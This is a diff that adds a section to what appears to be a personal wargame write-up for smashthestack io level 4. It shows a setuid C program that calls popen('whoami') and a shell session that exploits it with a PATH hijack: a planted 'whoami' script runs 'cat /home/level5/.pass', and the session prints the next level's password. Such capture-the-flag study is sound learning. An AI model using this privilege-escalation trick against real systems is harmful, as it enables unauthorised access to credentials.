@@ -153,6 +153,30 @@ nSwmULj2LpDnRGU2
 
 <hr>
 
+<p>The program:</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">//writen by bla</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+        <span class="kt">FILE</span><span class="o">*</span> <span class="n">f</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="s">&quot;whoami&quot;</span><span class="p">,</span><span class="s">&quot;r&quot;</span><span class="p">);</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">username</span><span class="p">),</span> <span class="n">f</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome %s&quot;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
+
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>I&#39;ll didn&#39;t know how to solve it at all really, guess when I meet a similar problem in the future the PATH will be more accessible in my head :)
+There&#39;s a good writeup here: <a href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/">http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/</a></p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">level4@io:/tmp/fisk<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;cat /home/level5/.pass&quot;</span> &gt;&gt; whoami
+level4@io:/tmp/fisk<span class="nv">$ </span>chmod <span class="m">777</span> whoami
+level4@io:/tmp/fisk<span class="nv">$ PATH</span><span class="o">=</span><span class="s2">&quot;/tmp/fisk:$PATH&quot;</span>
+level4@io:/tmp/fisk<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/tmp/fisk:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+level4@io:/tmp/fisk<span class="nv">$ </span>/levels/level04
+Welcome LOoCy5PbKi63qXTh
+</code></pre></div>
 <h2>Level05</h2>
 
 <hr>
